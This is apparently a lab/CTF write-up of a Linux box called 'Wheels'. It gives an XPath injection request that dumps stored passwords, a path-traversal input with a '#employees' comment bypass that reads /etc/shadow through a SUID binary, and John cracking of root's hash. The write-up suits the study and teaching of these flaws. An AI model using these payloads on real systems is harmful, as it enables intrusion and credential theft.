#Linux #XPathInjection #AccountTakeover #SUID #PathTraversal #john #CredentialHunting

## Overview

Wheels is a Linux web application box with a layered attack chain. An email address found on the site enables account registration that overwrites an existing employee account, granting portal access. XPath injection in the portal's search function dumps all user passwords from an XML data store. One of those passwords opens an SSH session as `bob`. The final escalation abuses a SUID binary that reads files by partial path, bypassing its own filter with a comment character to read `/etc/shadow`, crack root's hash, and `su` to root.

## Recon

### Port Scan

```sh
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.41 (Ubuntu)
```

A minimal two-port scan. Everything runs through the web application.

### Web Enumeration

The site is "Wheels - Car Repair Services". An email address was visible on the landing page:

```
info@wheels.service
```

Adding `wheels.service` to `/etc/hosts` made virtual-host-based routing work. The employee portal at `/portal.php` became accessible after registering a new account with the `wheels.service` domain email, the registration system accepted it and granted employee-level permissions.

> **Why domain-matching registration is a vulnerability:** the application trusted the email domain as a proxy for organizational membership. Registering `anything@wheels.service` passed the domain check and inherited whatever permissions that domain confers. This is account takeover without touching an existing password.

## Foothold

### XPath Injection

Once inside the portal, fuzzing the search field in Burp revealed an XPath error message. XPath is used to query XML documents the same way SQL queries databases, and it's just as injectable when user input isn't sanitized.

The injection payload (sourced from HackTricks):

```http
GET /portal.php?work=')]+|+//password%00&action=search HTTP/1.1
Host: wheels.service
Cookie: PHPSESSID=30rl18ij19ososnibtrqna34hl
```

Response returned all usernames and passwords from the XML data store:

```
bob:‹redacted›
alice:‹redacted›
john:‹redacted›
dan:‹redacted›
alex:‹redacted›
selene:‹redacted›
```

> **XPath injection vs SQL injection:** XPath operates on XML documents instead of relational tables, but the injection mechanics are similar, unsanitized input breaks out of the intended query context. The `|` operator in XPath performs a union, and `//password` selects all `password` nodes anywhere in the document. The null byte `%00` terminates the original expression cleanly. The result is equivalent to `SELECT * FROM passwords` in SQL injection terms.

SSH access using Bob's credentials:

```sh
ssh bob@192.168.158.202
bob@192.168.158.202's password:
$ whoami
bob
```

## Privilege Escalation

### SUID Binary Path Traversal + /etc/shadow Read

LinPEAS found credentials in the web config:

```sh
/var/www/html/config.php:    define('PASSWORD', 'CanRipperCrackthis?09');
/var/www/html/config.php:    define('USER', 'wheels');
```

More importantly, `/opt/get-list` had a SUID bit set. Running `strings` on the binary locally revealed it calls:

```
cat /root/details/employees
cat /root/details/customers
```

The binary accepts `customers` or `employees` as input and rejects anything else, designed to prevent traversal. The filter checks for those literal strings, but a shell comment character appended after them bypasses the check while not corrupting the path argument:

```sh
$ /opt/get-list

Which List do you want to open? [customers/employees]: ../../../../../../../../etc/shadow #employees
Opening File....

root:$6$Hk74of.if9klVVcS$EwLAljc7...:19123:0:99999:7:::
bob:$6$9hcN2TDv4v9edSth$KYm56Aj6...:19123:0:99999:7:::
```

> **Why `#employees` bypasses the filter but changes the path:** the binary's string check confirms `employees` appears in the input, so validation passes. But the input is then passed to `cat` (or equivalent) as a file path, where `#` begins a shell comment, meaning the part after `#` is ignored by the shell, and the traversal path `../../../../etc/shadow` is what actually gets read. The filter trusted that `employees` equaled a safe path; it only checked for substring presence.

Root's hash extracted:

```
root:$6$Hk74of.if9klVVcS$EwLAljc7.DOnqZqVOTC0dTa0bRd2ZzyapjBnEN8tgDGrR9ceWViHVtu6gSR.L/WTG398zZCqQiX7DP/1db3MF0:19123:...
```

Cracked with John:

```sh
john hash --wordlist=/usr/share/wordlists/rockyou.txt
‹redacted›   (root)
```

## Root

```sh
$ su root
Password:
# whoami
root
# cat proof.txt
‹redacted›
```

## Takeaways

- **Email domain registration checks are authorization controls, not authentication.** Any address at the trusted domain passes, and any email service or local domain entry can satisfy that.
- **XPath injection follows the same logic as SQL injection.** When an app queries XML with unsanitized input, union-style operators dump the entire document.
- **SUID binary filters that check for substring presence are trivially bypassed.** `#employees` satisfies the string check while the comment character strips the literal string from the actual file path.
